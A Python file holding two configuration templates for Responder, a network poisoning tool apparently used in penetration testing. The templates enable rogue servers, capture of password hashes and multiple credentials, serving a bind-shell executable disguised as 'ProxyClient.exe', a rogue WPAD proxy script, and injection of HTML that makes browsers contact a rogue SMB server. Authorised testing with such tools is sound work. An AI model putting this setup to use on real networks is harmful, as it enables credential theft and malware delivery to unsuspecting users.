#!/usr/bin/python

## Default Responder Configuration
responder_default_conf = '''[Responder Core]

; Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Custom challenge. 
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = Random

; SQLite Database file
; Delete this file to re-capture previously captured hashes
Database = Responder.db

; Default log file
SessionLog = Responder-Session.log

; Poisoners log
PoisonersLog = Poisoners-Session.log

; Analyze mode log
AnalyzeLog = Analyzer-Session.log

; Dump Responder Config log:
ResponderConfigDump = Config-Responder.log

; Specific IP Addresses to respond to (default = All)
; Example: RespondTo = 10.20.1.100-150, 10.20.3.10
RespondTo =

; Specific NBT-NS/LLMNR names to respond to (default = All)
; Example: RespondTo = WPAD, DEV, PROD, SQLINT
RespondToName = 

; Specific IP Addresses not to respond to (default = None)
; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10
DontRespondTo = %s

; Specific NBT-NS/LLMNR names not to respond to (default = None)
; Example: DontRespondTo = NAC, IPS, IDS
DontRespondToName = ISATAP

; If set to On, we will stop answering further requests from a host
; if a hash has been previously captured for this host.
AutoIgnoreAfterSuccess = Off

; If set to On, we will send ACCOUNT_DISABLED when the client tries
; to authenticate for the first time to try to get different credentials.
; This may break file serving and is useful only for hash capture
CaptureMultipleCredentials = On

; If set to On, we will write to file all hashes captured from the same host. 
; In this case, Responder will log from 172.16.0.12 all user hashes: domain	oto, 
; domain\popo, domain\zozo. Recommended value: On, capture everything.
CaptureMultipleHashFromSameHost = On

[HTTP Server]

; Set to On to always serve the custom EXE
Serve-Always = Off

; Set to On to replace any requested .exe with the custom EXE
Serve-Exe = Off

; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = Off

; Custom HTML to serve
HtmlFilename = files/AccessDenied.html

; Custom EXE File to serve
ExeFilename = files/BindShell.exe

; Name of the downloaded .exe that the client will see
ExeDownloadName = ProxyClient.exe

; Custom WPAD Script
WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY ProxySrv:3128; PROXY ProxySrv:3141; DIRECT';}

; HTML answer to inject in HTTP responses (before </body> tag).
; Set to an empty string to disable.
; In this example, we redirect make users' browsers issue a request to our rogue SMB server.
HTMLToInject = <img src='file://RespProxySrv/pictures/logo.jpg' alt='Loading' height='1' width='1'>

[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key

'''

# Disable Responder's HTTP services by default
responder_no_http_conf = '''[Responder Core]

; Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Custom challenge. 
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = Random

; SQLite Database file
; Delete this file to re-capture previously captured hashes
Database = Responder.db

; Default log file
SessionLog = Responder-Session.log

; Poisoners log
PoisonersLog = Poisoners-Session.log

; Analyze mode log
AnalyzeLog = Analyzer-Session.log

; Dump Responder Config log:
ResponderConfigDump = Config-Responder.log

; Specific IP Addresses to respond to (default = All)
; Example: RespondTo = 10.20.1.100-150, 10.20.3.10
RespondTo =

; Specific NBT-NS/LLMNR names to respond to (default = All)
; Example: RespondTo = WPAD, DEV, PROD, SQLINT
RespondToName = 

; Specific IP Addresses not to respond to (default = None)
; Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10
DontRespondTo = %s

; Specific NBT-NS/LLMNR names not to respond to (default = None)
; Example: DontRespondTo = NAC, IPS, IDS
DontRespondToName = ISATAP

; If set to On, we will stop answering further requests from a host
; if a hash has been previously captured for this host.
AutoIgnoreAfterSuccess = Off

; If set to On, we will send ACCOUNT_DISABLED when the client tries
; to authenticate for the first time to try to get different credentials.
; This may break file serving and is useful only for hash capture
CaptureMultipleCredentials = On

; If set to On, we will write to file all hashes captured from the same host. 
; In this case, Responder will log from 172.16.0.12 all user hashes: domain	oto, 
; domain\popo, domain\zozo. Recommended value: On, capture everything.
CaptureMultipleHashFromSameHost = On

[HTTP Server]

; Set to On to always serve the custom EXE
Serve-Always = Off

; Set to On to replace any requested .exe with the custom EXE
Serve-Exe = Off

; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = Off

; Custom HTML to serve
HtmlFilename = files/AccessDenied.html

; Custom EXE File to serve
ExeFilename = files/BindShell.exe

; Name of the downloaded .exe that the client will see
ExeDownloadName = ProxyClient.exe

; Custom WPAD Script
WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY ProxySrv:3128; PROXY ProxySrv:3141; DIRECT';}

; HTML answer to inject in HTTP responses (before </body> tag).
; Set to an empty string to disable.
; In this example, we redirect make users' browsers issue a request to our rogue SMB server.
HTMLToInject = <img src='file://RespProxySrv/pictures/logo.jpg' alt='Loading' height='1' width='1'>

[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = certs/responder.crt
SSLKey = certs/responder.key

'''